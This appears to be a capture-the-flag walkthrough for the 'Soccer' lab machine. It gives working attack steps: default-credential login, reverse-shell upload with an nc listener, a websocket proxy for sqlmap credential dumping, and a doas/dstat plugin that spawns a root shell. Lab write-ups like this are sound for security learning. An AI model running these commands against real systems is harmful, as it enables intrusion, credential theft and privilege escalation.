# 10.10.11.194

## NMAP Scan
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sun, 26 Oct 2025 21:00:15 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sun, 26 Oct 2025 21:00:15 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>

```

## Foothold
- directory ffuf on the webapp gives a new folder `soccer.htb/tiny` reveals a `tiny file manager v2.4.3`
- checking the github docs for the website, we can see that the main page has admin creds listed `admin:admin@123` which works
- we can see the `/var/www/html` directories and files
- we cant upload `php-reverse-shell.py` to `/var/www/html` but we can upload to `/var/www/html/tiny/uploads`
- start the nc listener and `OPEN` the file on the tiny portal to get the foothold
- with `www-data` we can see `/home/player` but cant view contents
- running linpeas.sh
```
Vulnerable to CVE-2021-3560

Sudo version 1.8.31

/usr/bin/rescan-scsi-bus.sh
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2022-11-17+09:09:15.5479107120 /usr/local/bin/doasedit
2022-11-17+09:09:15.5439087120 /usr/local/bin/vidoas
2022-11-17+09:09:15.5399067120 /usr/local/bin/doas
2022-11-15+21:42:19.3514476930 /etc/grub.d/01_track_initrdless_boot_fallback
2022-11-15+21:40:43.9906230840 /etc/console-setup/cached_setup_terminal.sh
2022-11-15+21:40:43.9906230840 /etc/console-setup/cached_setup_keyboard.sh
2022-11-15+21:40:43.9906230840 /etc/console-setup/cached_setup_font.sh

book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation
logrotate 3.14.0

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1129/nginx: worker
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      1129/nginx: worker
tcp6       0      0 :::22                   :::*                    LISTEN      -

```

- reading the `/etc/nginx/sites-enabled` configuration, we see that there is a `soc-player.soccer.htb` vhost attached that is forwarding to `localhost:3000`
- add that to `/etc/hosts`, go to that site and create an account
- in `check` tickets see that when we enter something, the response changes.
- looking at burp we dont see any request going to the server so something on the clientside
- reading the code, we understand that the site is connecting to a websocket at `ws://soc-player.soccer.htb:9091`
- send that to repeater and trying a few payloads we get nothing.
- create the below script `websocket.py` for proxying the websocket and `python3 websocket.py`
```
from flask import Flask, request
import websocket, json

app = Flask(__name__)

@app.route('/proxy')
def proxy():
    id = request.args.get('id')
    ws = websocket.create_connection("ws://soc-player.soccer.htb:9091")
    ws.send(json.dumps({"id": id}))
    result = ws.recv()
    ws.close()
    return result

app.run(port=5000)
```
- `sqlmap -u "http://localhost:5000/proxy?id=1"`
    - says `id` is injectable
- `sqlmap -u "http://localhost:5000/proxy?id=1" --current-db --threads 10` - get the database
- `sqlmap -u "http://localhost:5000/proxy?id=1" --tables -D soccer_db --threads 10` - get the tables
- `sqlmap -u "http://localhost:5000/proxy?id=1" --dump -T accounts -D soccer_db --threads 10` - dump the table to find the creds for `player`
    - `player:PlayerOftheMatch2022`
- ssh to get user.txt - b0f1f9411febfe06a0c8426821cd0924

## Privesc
- running `linpeas.sh` again
- nothing new, going back to the `/etc/local/bin/doas` to see that it has the `SUID` privilege
- checking the `doas` configuration:
    - `find / -type f -name "doas.conf" 2>/dev/null`
    ```
    $ cat etc/doas.conf 
    permit nopass player as root cmd /usr/bin/dstat
    ```
    - player can run `/usr/bin/dstat` as root without the password
- checking `gtfobins` for `dstat`
    - `echo 'import os; os.execv("/bin/sh", ["sh"])' >/usr/local/share/dstat/dstat_xxx.py`
    - `doas -u root /usr/bin/dstat --xxx`
    - gives root shell
    - get root.txt - ef1448d69960eed3c4b5416403dce2bd
